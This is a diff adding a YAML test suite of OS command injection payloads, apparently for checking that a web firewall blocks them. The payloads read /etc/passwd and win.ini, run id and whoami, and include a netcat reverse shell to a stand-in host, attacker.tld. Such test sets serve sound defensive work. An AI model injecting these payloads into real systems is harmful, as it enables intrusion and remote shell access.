@@ -1,0 +1,41 @@
+suite: rce
+kind: attack
+category: rce
+expected: blocked
+severity: critical
+description: "OS Command Injection / RCE — Mikiri curated set"
+references: ["CWE-77", "CWE-78", "OWASP-A03:2021"]
+
+default_placements: [url_query, header, cookie, body_urlencoded, body_json]
+default_encoders:
+  - [none]
+  - [url]
+  - [url_double]
+  - [base64]
+
+payloads:
+  - id: rce-semi-0001
+    raw: "; cat /etc/passwd"
+    tags: [unix, separator]
+  - id: rce-pipe-0002
+    raw: "| id"
+    tags: [unix, pipe]
+  - id: rce-sub-0003
+    raw: "$(cat /etc/passwd)"
+    tags: [unix, subshell]
+  - id: rce-backtick-0004
+    raw: "`uname -a`"
+    tags: [unix, backtick]
+  - id: rce-and-0005
+    raw: "&& whoami"
+    tags: [unix, chain]
+  - id: rce-win-0006
+    raw: "& type C:\\Windows\\win.ini"
+    tags: [windows]
+  - id: rce-newline-0007
+    raw: "%0acat%20/etc/passwd"
+    encoders: [[none], [url]]
+    tags: [unix, newline]
+  - id: rce-nc-0008
+    raw: "; nc attacker.tld 4444 -e /bin/sh"
+    tags: [unix, reverse-shell]
